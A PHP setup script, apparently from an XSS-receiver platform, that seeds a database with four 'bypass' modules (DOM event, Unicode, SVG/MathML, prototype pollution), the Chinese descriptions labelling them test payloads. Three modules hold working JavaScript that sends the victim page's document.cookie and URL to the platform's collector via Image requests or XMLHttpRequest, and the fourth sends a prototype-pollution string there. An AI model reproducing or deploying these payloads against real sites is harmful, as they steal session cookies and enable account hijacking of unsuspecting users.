<?php
/**
 * 添加測試模塊
 */
include('../init.php');

$db = DBConnect();

// 檢查是否已存在測試模塊
$check = $db->FirstValue("SELECT COUNT(*) FROM ".Tb('module')." WHERE title LIKE '%Bypass%' OR title LIKE '%Pollution%'");
if ($check == 0) {
    // 模塊1: DOM Event
    $values1 = array(
        'title' => 'DOM Event Bypass',
        'description' => '常用DOM事件測試payload - 測試各種on事件繞過',
        'userId' => 1,
        '`keys`' => '["location","documentURI"]',
        '`setkeys`' => '[]',
        'code' => 'var d=document; var u=d.URL; new Image().src="{projectUrl}?url="+encodeURIComponent(u)+"&c="+encodeURIComponent(d.cookie);',
        'isOpen' => 1,
        'isAudit' => 1,
        'addTime' => time()
    );
    $db->AutoExecute(Tb('module'), $values1);

    // 模塊2: Unicode Bypass
    $values2 = array(
        'title' => 'Unicode Encoding Bypass',
        'description' => 'Unicode轉義編碼測試 - 測試\\u0069等形式繞過',
        'userId' => 1,
        '`keys`' => '["data"]',
        '`setkeys`' => '[]',
        'code' => 'var x=new XMLHttpRequest();x.open("POST","{projectUrl}",true);x.setRequestHeader("Content-type","application/x-www-form-urlencoded");x.send("d="+encodeURIComponent(document.cookie));',
        'isOpen' => 1,
        'isAudit' => 1,
        'addTime' => time()
    );
    $db->AutoExecute(Tb('module'), $values2);

    // 模塊3: SVG Bypass
    $values3 = array(
        'title' => 'SVG/MathML Bypass',
        'description' => 'SVG和MathML標籤測試 - 測試svg、math標籤繞過',
        'userId' => 1,
        '`keys`' => '["src","href"]',
        '`setkeys`' => '[]',
        'code' => 'var i=new Image();i.src="{projectUrl}?c="+encodeURIComponent(document.cookie);',
        'isOpen' => 1,
        'isAudit' => 1,
        'addTime' => time()
    );
    $db->AutoExecute(Tb('module'), $values3);

    // 模塊4: Prototype Pollution
    $values4 = array(
        'title' => 'Prototype Pollution',
        'description' => 'JS原型鏈污染測試Payload',
        'userId' => 1,
        '`keys`' => '["__proto__"]',
        '`setkeys`' => '[]',
        'code' => '// Prototype test fetch("{projectUrl}?p="+encodeURIComponent(JSON.stringify({__proto__:{isAdmin:true}})));',
        'isOpen' => 1,
        'isAudit' => 1,
        'addTime' => time()
    );
    $db->AutoExecute(Tb('module'), $values4);

    echo "測試模塊已添加\n";
} else {
    echo "測試模塊已存在\n";
}
